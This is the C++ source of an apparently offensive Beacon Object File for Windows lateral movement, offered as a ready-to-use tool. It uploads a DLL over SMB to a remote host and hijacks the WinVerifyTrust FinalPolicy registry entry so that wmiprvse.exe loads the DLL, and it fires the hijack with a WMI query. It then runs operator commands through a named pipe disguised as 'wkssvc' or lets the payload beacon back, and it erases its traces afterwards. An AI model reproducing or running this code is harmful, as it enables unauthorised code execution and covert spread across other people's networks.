/*
 * tmb_sipexec.cpp — Lateral movement via WinVerifyTrust FinalPolicy hijack
 *
 * Two modes:
 *   jump (mode=0):        Upload DLL, hijack FinalPolicy, trigger WMI, DLL calls back as beacon
 *   remote-exec (mode=1): Upload DLL, hijack FinalPolicy, trigger WMI, connect pipe, run cmd, return output
 *
 * Uses current token. Run make_token / steal_token first if needed.
 *
 * Args (packed by aggressor/axscript):
 *   short  mode           0=jump, 1=exec
 *   char*  target         hostname or IP
 *   char*  command        command to run (exec mode only, empty for jump)
 *   int    dll_len        length of DLL data (0 = use dll_path as UNC)
 *   char*  dll_data       raw DLL bytes (if dll_len > 0)
 *   char*  dll_path       UNC override path (if dll_len == 0, use this path directly)
 *   char*  share          share name for upload (default ADMIN$)
 *   char*  guid           FinalPolicy GUID alias: "default", "driver", "https"
 *   short  no_cleanup     1 = skip registry restore + file delete
 */

#include <windows.h>
#include <wbemcli.h>
#include <comdef.h>
#include <stdio.h>

extern "C" {
#include "beacon.h"

void go(char *args, int alen);

/* ---- Win32 imports (BOF convention) ---- */
DECLSPEC_IMPORT HMODULE  WINAPI KERNEL32$GetModuleHandleA(LPCSTR);
DECLSPEC_IMPORT DWORD    WINAPI KERNEL32$GetLastError(VOID);
DECLSPEC_IMPORT HANDLE   WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$WriteFile(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$DeleteFileA(LPCSTR);
DECLSPEC_IMPORT VOID     WINAPI KERNEL32$Sleep(DWORD);
DECLSPEC_IMPORT DWORD    WINAPI KERNEL32$WaitForSingleObject(HANDLE, DWORD);
DECLSPEC_IMPORT HANDLE   WINAPI KERNEL32$CreateEventA(LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCSTR);
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$SetEvent(HANDLE);
DECLSPEC_IMPORT void*    WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT HANDLE   WINAPI KERNEL32$GetProcessHeap(void);
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);

DECLSPEC_IMPORT LONG     WINAPI ADVAPI32$RegConnectRegistryA(LPCSTR, HKEY, PHKEY);
DECLSPEC_IMPORT LONG     WINAPI ADVAPI32$RegOpenKeyExA(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
DECLSPEC_IMPORT LONG     WINAPI ADVAPI32$RegCreateKeyExA(HKEY, LPCSTR, DWORD, LPSTR, DWORD, REGSAM, LPSECURITY_ATTRIBUTES, PHKEY, LPDWORD);
DECLSPEC_IMPORT LONG     WINAPI ADVAPI32$RegSetValueExA(HKEY, LPCSTR, DWORD, DWORD, const BYTE*, DWORD);
DECLSPEC_IMPORT LONG     WINAPI ADVAPI32$RegQueryValueExA(HKEY, LPCSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
DECLSPEC_IMPORT LONG     WINAPI ADVAPI32$RegCloseKey(HKEY);

DECLSPEC_IMPORT HRESULT  WINAPI OLE32$CoInitializeEx(LPVOID, DWORD);
DECLSPEC_IMPORT VOID     WINAPI OLE32$CoUninitialize(void);
DECLSPEC_IMPORT HRESULT  WINAPI OLE32$CoCreateInstance(REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID*);
DECLSPEC_IMPORT HRESULT  WINAPI OLE32$CoSetProxyBlanket(IUnknown*, DWORD, DWORD, OLECHAR*, DWORD, DWORD, RPC_AUTH_IDENTITY_HANDLE, DWORD);

DECLSPEC_IMPORT BSTR     WINAPI OLEAUT32$SysAllocString(const OLECHAR*);
DECLSPEC_IMPORT VOID     WINAPI OLEAUT32$SysFreeString(BSTR);

WINBASEAPI int __cdecl MSVCRT$_snprintf(char*, size_t, const char*, ...);
WINBASEAPI size_t __cdecl MSVCRT$strlen(const char*);
WINBASEAPI int __cdecl MSVCRT$_stricmp(const char*, const char*);

} /* extern "C" */

/* ---- Macros ---- */
#define TMB_OK(fmt, ...)    BeaconPrintf(CALLBACK_OUTPUT, "[+] " fmt, ##__VA_ARGS__)
#define TMB_INFO(fmt, ...)  BeaconPrintf(CALLBACK_OUTPUT, "[*] " fmt, ##__VA_ARGS__)
#define TMB_WARN(fmt, ...)  BeaconPrintf(CALLBACK_OUTPUT, "[!] " fmt, ##__VA_ARGS__)
#define TMB_ERR(fmt, ...)   BeaconPrintf(CALLBACK_ERROR,  "[-] " fmt, ##__VA_ARGS__)

/* ---- FinalPolicy GUIDs ---- */
#define FP_GUID_DEFAULT  "{00AAC56B-CD44-11D0-8CC2-00C04FC295EE}"
#define FP_GUID_DRIVER   "{573E31F8-AABA-11D0-8CCB-00C04FC295EE}"
#define FP_GUID_HTTPS    "{FC451C16-AC75-11D1-B4B8-00C04FB66EA0}"

#define FP_KEY_PREFIX    "SOFTWARE\\Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy\\"

/* ---- Pipe marker (must match payload) ---- */
#define PIPE_DONE_MARKER "\n[DONE]\n"
#define PIPE_DONE_LEN    8

/* ---- FNV-1a (must match payload's derivation) ---- */
static unsigned int fnv1a(const char *s) {
    unsigned int h = 2166136261u;
    for (; *s; s++) { h ^= (unsigned char)*s; h *= 16777619u; }
    return h;
}

static void derive_pipe_name(const char *dll_basename, char *out, int outlen) {
    /* lowercase the basename */
    char lower[260] = {0};
    int i = 0;
    for (; dll_basename[i] && i < 259; i++)
        lower[i] = (dll_basename[i] >= 'A' && dll_basename[i] <= 'Z')
                   ? dll_basename[i] + 32 : dll_basename[i];
    lower[i] = '\0';
    MSVCRT$_snprintf(out, outlen, "\\\\%s\\pipe\\wkssvc_%08x", "", fnv1a(lower));
}

/* ---- Random DLL name ---- */
static void random_dll_name(char *out, int len) {
    /* ponytail: use GetTickCount as entropy source — good enough for a filename */
    DWORD tick = __rdtsc() & 0xFFFFFFFF;
    MSVCRT$_snprintf(out, len, "tmb_%08x.dll", tick);
}

/* ---- Extract basename from path ---- */
static const char* basename_of(const char *path) {
    const char *p = path;
    for (const char *q = path; *q; q++)
        if (*q == '\\' || *q == '/') p = q + 1;
    return p;
}

/* ================================================================
 * Phase 1: Upload DLL to target via SMB
 * ================================================================ */
static BOOL upload_dll(const char *target, const char *share, const char *dll_name,
                       const char *dll_data, int dll_len, char *remote_path_out, int path_len) {
    /* Build UNC path: \\target\share\dll_name */
    MSVCRT$_snprintf(remote_path_out, path_len, "\\\\%s\\%s\\%s", target, share, dll_name);

    HANDLE hFile = KERNEL32$CreateFileA(remote_path_out, GENERIC_WRITE, 0, NULL,
                                         CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        TMB_ERR("Failed to create %s (error %lu)", remote_path_out, KERNEL32$GetLastError());
        return FALSE;
    }

    DWORD written = 0;
    BOOL ok = KERNEL32$WriteFile(hFile, dll_data, dll_len, &written, NULL);
    KERNEL32$CloseHandle(hFile);

    if (!ok || (int)written != dll_len) {
        TMB_ERR("Write failed (%lu of %d bytes)", written, dll_len);
        KERNEL32$DeleteFileA(remote_path_out);
        return FALSE;
    }

    TMB_INFO("Uploaded %d bytes → %s", dll_len, remote_path_out);
    return TRUE;
}

/* ================================================================
 * Phase 2: Remote registry — hijack FinalPolicy $DLL
 * ================================================================ */

typedef struct {
    char orig_dll[260];
    char orig_func[128];
    BOOL had_orig;
} FP_BACKUP;

static BOOL hijack_finalpolicy(const char *target, const char *guid,
                                const char *payload_path, FP_BACKUP *backup) {
    HKEY hRemote = NULL;
    LONG rc = ADVAPI32$RegConnectRegistryA(target, HKEY_LOCAL_MACHINE, &hRemote);
    if (rc != ERROR_SUCCESS) {
        TMB_ERR("RegConnectRegistry failed: %ld (is RemoteRegistry running?)", rc);
        return FALSE;
    }

    char keyPath[512];
    MSVCRT$_snprintf(keyPath, sizeof(keyPath), "%s%s", FP_KEY_PREFIX, guid);

    HKEY hKey = NULL;
    DWORD disp = 0;
    rc = ADVAPI32$RegCreateKeyExA(hRemote, keyPath, 0, NULL, 0,
                                   KEY_READ | KEY_SET_VALUE, NULL, &hKey, &disp);
    if (rc != ERROR_SUCCESS) {
        TMB_ERR("RegCreateKeyEx failed: %ld", rc);
        ADVAPI32$RegCloseKey(hRemote);
        return FALSE;
    }

    /* Backup original $DLL and $Function */
    backup->had_orig = FALSE;
    DWORD type, sz;

    sz = sizeof(backup->orig_dll);
    if (ADVAPI32$RegQueryValueExA(hKey, "$DLL", NULL, &type,
                                   (BYTE*)backup->orig_dll, &sz) == ERROR_SUCCESS) {
        backup->had_orig = TRUE;
    }
    sz = sizeof(backup->orig_func);
    ADVAPI32$RegQueryValueExA(hKey, "$Function", NULL, &type,
                               (BYTE*)backup->orig_func, &sz);

    /* Write hijack: $DLL = payload path */
    rc = ADVAPI32$RegSetValueExA(hKey, "$DLL", 0, REG_SZ,
                                  (const BYTE*)payload_path,
                                  (DWORD)MSVCRT$strlen(payload_path) + 1);
    if (rc != ERROR_SUCCESS) {
        TMB_ERR("RegSetValueEx $DLL failed: %ld", rc);
        ADVAPI32$RegCloseKey(hKey);
        ADVAPI32$RegCloseKey(hRemote);
        return FALSE;
    }

    /* $Function = SoftpubAuthenticode (matches our payload export) */
    const char *func = "SoftpubAuthenticode";
    ADVAPI32$RegSetValueExA(hKey, "$Function", 0, REG_SZ,
                             (const BYTE*)func, (DWORD)MSVCRT$strlen(func) + 1);

    ADVAPI32$RegCloseKey(hKey);
    ADVAPI32$RegCloseKey(hRemote);

    TMB_INFO("FinalPolicy hijacked: $DLL → %s", payload_path);
    return TRUE;
}

static void restore_finalpolicy(const char *target, const char *guid, FP_BACKUP *backup) {
    if (!backup->had_orig) return;

    HKEY hRemote = NULL;
    if (ADVAPI32$RegConnectRegistryA(target, HKEY_LOCAL_MACHINE, &hRemote) != ERROR_SUCCESS) return;

    char keyPath[512];
    MSVCRT$_snprintf(keyPath, sizeof(keyPath), "%s%s", FP_KEY_PREFIX, guid);

    HKEY hKey = NULL;
    if (ADVAPI32$RegOpenKeyExA(hRemote, keyPath, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        ADVAPI32$RegSetValueExA(hKey, "$DLL", 0, REG_SZ,
                                 (const BYTE*)backup->orig_dll,
                                 (DWORD)MSVCRT$strlen(backup->orig_dll) + 1);
        ADVAPI32$RegSetValueExA(hKey, "$Function", 0, REG_SZ,
                                 (const BYTE*)backup->orig_func,
                                 (DWORD)MSVCRT$strlen(backup->orig_func) + 1);
        ADVAPI32$RegCloseKey(hKey);
    }
    ADVAPI32$RegCloseKey(hRemote);
    TMB_INFO("FinalPolicy restored");
}

/* ================================================================
 * Phase 3: WMI trigger — force WinVerifyTrust call on target
 *
 * Queries Win32_PnPSignedDriver which triggers signature verification
 * on driver files, causing wmiprvse.exe to call WinVerifyTrust and
 * load our hijacked FinalPolicy DLL.
 * ================================================================ */
static BOOL trigger_wmi(const char *target) {
    HRESULT hr = OLE32$CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) {
        TMB_ERR("CoInitializeEx failed: 0x%08lx", hr);
        return FALSE;
    }

    /* IWbemLocator CLSID and IID */
    CLSID clsid_WbemLocator = {0x4590f811, 0x1d3a, 0x11d0,
                                 {0x89, 0x1f, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24}};
    IID iid_IWbemLocator = {0xdc12a687, 0x737f, 0x11cf,
                             {0x88, 0x4d, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24}};

    IWbemLocator *pLocator = NULL;
    hr = OLE32$CoCreateInstance(clsid_WbemLocator, NULL, CLSCTX_INPROC_SERVER,
                                iid_IWbemLocator, (void**)&pLocator);
    if (FAILED(hr)) {
        TMB_ERR("CoCreateInstance(WbemLocator) failed: 0x%08lx", hr);
        OLE32$CoUninitialize();
        return FALSE;
    }

    /* Build connection string: \\target\ROOT\CIMV2 */
    wchar_t wTarget[512];
    int i = 0;
    wTarget[i++] = L'\\'; wTarget[i++] = L'\\';
    for (const char *p = target; *p && i < 500; p++) wTarget[i++] = (wchar_t)*p;
    const wchar_t suffix[] = L"\\ROOT\\CIMV2";
    for (int j = 0; suffix[j] && i < 510; j++) wTarget[i++] = suffix[j];
    wTarget[i] = L'\0';

    BSTR bstrTarget = OLEAUT32$SysAllocString(wTarget);

    IWbemServices *pSvc = NULL;
    hr = pLocator->ConnectServer(bstrTarget, NULL, NULL, 0,
                                  WBEM_FLAG_CONNECT_USE_MAX_WAIT, NULL, NULL, &pSvc);
    OLEAUT32$SysFreeString(bstrTarget);

    if (FAILED(hr)) {
        TMB_ERR("WMI ConnectServer failed: 0x%08lx", hr);
        pLocator->Release();
        OLE32$CoUninitialize();
        return FALSE;
    }

    /* Set security on the proxy — use current token */
    hr = OLE32$CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
                                  RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE,
                                  NULL, EOAC_NONE);
    if (FAILED(hr)) {
        TMB_WARN("CoSetProxyBlanket: 0x%08lx (continuing)", hr);
    }

    /* Execute query that forces signature verification */
    BSTR bstrWQL = OLEAUT32$SysAllocString(L"WQL");
    BSTR bstrQuery = OLEAUT32$SysAllocString(L"SELECT DeviceName FROM Win32_PnPSignedDriver WHERE DeviceName IS NOT NULL");

    IEnumWbemClassObject *pEnum = NULL;
    hr = pSvc->ExecQuery(bstrWQL, bstrQuery,
                          WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
                          NULL, &pEnum);
    OLEAUT32$SysFreeString(bstrWQL);
    OLEAUT32$SysFreeString(bstrQuery);

    if (FAILED(hr)) {
        TMB_ERR("ExecQuery failed: 0x%08lx", hr);
        pSvc->Release();
        pLocator->Release();
        OLE32$CoUninitialize();
        return FALSE;
    }

    /* Fetch at least one result to ensure WVT fires */
    IWbemClassObject *pObj = NULL;
    ULONG uReturn = 0;
    hr = pEnum->Next(WBEM_INFINITE, 1, &pObj, &uReturn);
    if (pObj) pObj->Release();

    pEnum->Release();
    pSvc->Release();
    pLocator->Release();
    OLE32$CoUninitialize();

    TMB_INFO("WMI trigger fired (Win32_PnPSignedDriver)");
    return TRUE;
}

/* ================================================================
 * Phase 4: Connect to named pipe and execute command (exec mode)
 * ================================================================ */
static BOOL pipe_exec(const char *target, const char *dll_basename,
                      const char *command) {
    /* Derive pipe name using FNV-1a of lowercase DLL basename */
    char lower[260] = {0};
    int i = 0;
    for (; dll_basename[i] && i < 259; i++)
        lower[i] = (dll_basename[i] >= 'A' && dll_basename[i] <= 'Z')
                   ? dll_basename[i] + 32 : dll_basename[i];
    lower[i] = '\0';

    char pipePath[512];
    MSVCRT$_snprintf(pipePath, sizeof(pipePath), "\\\\%s\\pipe\\wkssvc_%08x",
                     target, fnv1a(lower));

    TMB_INFO("Connecting to pipe: %s", pipePath);

    /* Retry loop — DLL needs time to start pipe_worker */
    HANDLE hPipe = INVALID_HANDLE_VALUE;
    for (int attempt = 0; attempt < 15; attempt++) {
        hPipe = KERNEL32$CreateFileA(pipePath, GENERIC_READ | GENERIC_WRITE,
                                      0, NULL, OPEN_EXISTING, 0, NULL);
        if (hPipe != INVALID_HANDLE_VALUE) break;
        KERNEL32$Sleep(1000);
    }

    if (hPipe == INVALID_HANDLE_VALUE) {
        TMB_ERR("Failed to connect to pipe after 15s (error %lu)", KERNEL32$GetLastError());
        return FALSE;
    }

    /* Read greeting: "OK <pid> imp=<0|1>\n" */
    char greeting[256] = {0};
    DWORD nRead = 0;
    KERNEL32$ReadFile(hPipe, greeting, sizeof(greeting) - 1, &nRead, NULL);
    if (nRead > 0) {
        greeting[nRead] = '\0';
        TMB_INFO("Pipe: %s", greeting);
    }

    /* Send command */
    DWORD nWritten = 0;
    KERNEL32$WriteFile(hPipe, command, (DWORD)MSVCRT$strlen(command), &nWritten, NULL);

    /* Read output until [DONE] marker */
    char buf[4096];
    int output_len = 0;
    char *output_buf = (char*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(),
                                                   HEAP_ZERO_MEMORY, 65536);
    if (!output_buf) {
        TMB_ERR("HeapAlloc failed");
        KERNEL32$CloseHandle(hPipe);
        return FALSE;
    }

    for (;;) {
        nRead = 0;
        if (!KERNEL32$ReadFile(hPipe, buf, sizeof(buf), &nRead, NULL) || nRead == 0)
            break;

        /* Append to output buffer */
        if (output_len + (int)nRead < 65536) {
            for (DWORD j = 0; j < nRead; j++)
                output_buf[output_len++] = buf[j];
        }

        /* Check for DONE marker */
        if (output_len >= PIPE_DONE_LEN) {
            if (output_buf[output_len - PIPE_DONE_LEN] == '\n' &&
                output_buf[output_len - 7] == '[' &&
                output_buf[output_len - 6] == 'D' &&
                output_buf[output_len - 5] == 'O' &&
                output_buf[output_len - 4] == 'N' &&
                output_buf[output_len - 3] == 'E' &&
                output_buf[output_len - 2] == ']' &&
                output_buf[output_len - 1] == '\n') {
                output_len -= PIPE_DONE_LEN;
                break;
            }
        }
    }

    /* Send exit to close pipe cleanly */
    const char *exitcmd = "exit";
    KERNEL32$WriteFile(hPipe, exitcmd, 4, &nWritten, NULL);
    KERNEL32$CloseHandle(hPipe);

    /* Print output */
    output_buf[output_len] = '\0';
    if (output_len > 0) {
        BeaconOutput(CALLBACK_OUTPUT, output_buf, output_len);
    }

    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, output_buf);
    return TRUE;
}

/* ================================================================
 * Phase 5: Cleanup — delete uploaded DLL
 * ================================================================ */
static void cleanup_dll(const char *remote_path) {
    /* Small delay for wmiprvse to release the file handle (DLL pins itself,
     * but the initial CreateFile handle is released after LoadLibrary) */
    KERNEL32$Sleep(500);
    if (KERNEL32$DeleteFileA(remote_path)) {
        TMB_INFO("Deleted %s", remote_path);
    } else {
        TMB_WARN("Could not delete %s (error %lu) — DLL may be locked",
                 remote_path, KERNEL32$GetLastError());
    }
}

/* ================================================================
 * Resolve GUID string from alias
 * ================================================================ */
static const char* resolve_guid(const char *alias) {
    if (!alias || !*alias || MSVCRT$_stricmp(alias, "default") == 0)
        return FP_GUID_DEFAULT;
    if (MSVCRT$_stricmp(alias, "driver") == 0)
        return FP_GUID_DRIVER;
    if (MSVCRT$_stricmp(alias, "https") == 0)
        return FP_GUID_HTTPS;
    /* Raw GUID passthrough */
    if (alias[0] == '{')
        return alias;
    return FP_GUID_DEFAULT;
}

/* ================================================================
 * Compute the local path the DLL will be at on target (for registry)
 * ================================================================ */
static void compute_target_local_path(const char *share, const char *dll_name,
                                       char *out, int outlen) {
    /* Map share to local path:
     * ADMIN$ -> C:\Windows\<dll>
     * C$     -> C:\<dll>
     * Otherwise assume C:\Windows\Temp */
    if (MSVCRT$_stricmp(share, "ADMIN$") == 0) {
        MSVCRT$_snprintf(out, outlen, "C:\\Windows\\%s", dll_name);
    } else if (MSVCRT$strlen(share) == 2 && share[1] == '$') {
        MSVCRT$_snprintf(out, outlen, "%c:\\%s", share[0], dll_name);
    } else {
        /* Generic — assume C:\Windows\Temp */
        MSVCRT$_snprintf(out, outlen, "C:\\Windows\\Temp\\%s", dll_name);
    }
}

/* ================================================================
 * ENTRY POINT
 * ================================================================ */
extern "C" void go(char *args, int alen) {
    datap parser;
    BeaconDataParse(&parser, args, alen);

    short mode = BeaconDataShort(&parser);          /* 0=jump, 1=exec */
    int tmp = 0;
    char *target = BeaconDataExtract(&parser, &tmp);
    char *command = BeaconDataExtract(&parser, &tmp);
    int dll_len = BeaconDataInt(&parser);
    char *dll_data = BeaconDataExtract(&parser, &tmp);
    char *dll_path_override = BeaconDataExtract(&parser, &tmp);
    char *share = BeaconDataExtract(&parser, &tmp);
    char *guid_alias = BeaconDataExtract(&parser, &tmp);
    short no_cleanup = BeaconDataShort(&parser);

    if (!target || !*target) {
        TMB_ERR("Target is required.");
        return;
    }

    if (mode == 1 && (!command || !*command)) {
        TMB_ERR("Command is required for exec mode.");
        return;
    }

    /* Defaults */
    if (!share || !*share) share = (char*)"ADMIN$";
    const char *guid = resolve_guid(guid_alias);

    TMB_INFO("SIPExec %s → %s (FinalPolicy: %s)",
             mode == 0 ? "jump" : "remote-exec", target, guid);

    /* ---- Phase 1: Stage DLL ---- */
    char remote_unc[512] = {0};
    char dll_name[260] = {0};
    char target_local_path[512] = {0};
    BOOL uploaded = FALSE;

    if (dll_path_override && *dll_path_override) {
        /* Use operator-supplied path directly (UNC or local-on-target) */
        MSVCRT$_snprintf(remote_unc, sizeof(remote_unc), "%s", dll_path_override);
        MSVCRT$_snprintf(target_local_path, sizeof(target_local_path), "%s", dll_path_override);
        MSVCRT$_snprintf(dll_name, sizeof(dll_name), "%s", basename_of(dll_path_override));
        TMB_INFO("Using existing path: %s", dll_path_override);
    } else if (dll_len > 0 && dll_data) {
        /* Upload DLL to target */
        random_dll_name(dll_name, sizeof(dll_name));
        if (!upload_dll(target, share, dll_name, dll_data, dll_len,
                        remote_unc, sizeof(remote_unc))) {
            return;
        }
        uploaded = TRUE;
        compute_target_local_path(share, dll_name, target_local_path, sizeof(target_local_path));
    } else {
        TMB_ERR("No DLL provided (pass file bytes or UNC path).");
        return;
    }

    /* ---- Phase 2: Hijack FinalPolicy ---- */
    FP_BACKUP backup = {0};
    if (!hijack_finalpolicy(target, guid, target_local_path, &backup)) {
        if (uploaded) KERNEL32$DeleteFileA(remote_unc);
        return;
    }

    /* ---- Phase 3: Trigger via WMI ---- */
    /* Small delay for registry propagation */
    KERNEL32$Sleep(500);

    if (!trigger_wmi(target)) {
        TMB_WARN("WMI trigger failed — attempting restore");
        restore_finalpolicy(target, guid, &backup);
        if (uploaded) KERNEL32$DeleteFileA(remote_unc);
        return;
    }

    /* ---- Phase 4: Restore registry (DLL is already loaded and pinned) ---- */
    /* Wait for DLL to self-pin via LoadLibrary before restoring */
    KERNEL32$Sleep(2000);

    if (!no_cleanup) {
        restore_finalpolicy(target, guid, &backup);
    }

    /* ---- Phase 5: Exec mode — connect to pipe ---- */
    if (mode == 1) {
        if (!pipe_exec(target, dll_name, command)) {
            TMB_ERR("Pipe execution failed");
        }
    } else {
        TMB_OK("Jump complete. DLL loaded in wmiprvse.exe on %s", target);
        TMB_INFO("Payload should call back via its configured listener.");
    }

    /* ---- Phase 6: Cleanup DLL from disk ---- */
    if (!no_cleanup && uploaded) {
        cleanup_dll(remote_unc);
    }

    if (mode == 1) {
        TMB_OK("Execution complete on %s", target);
    }
}
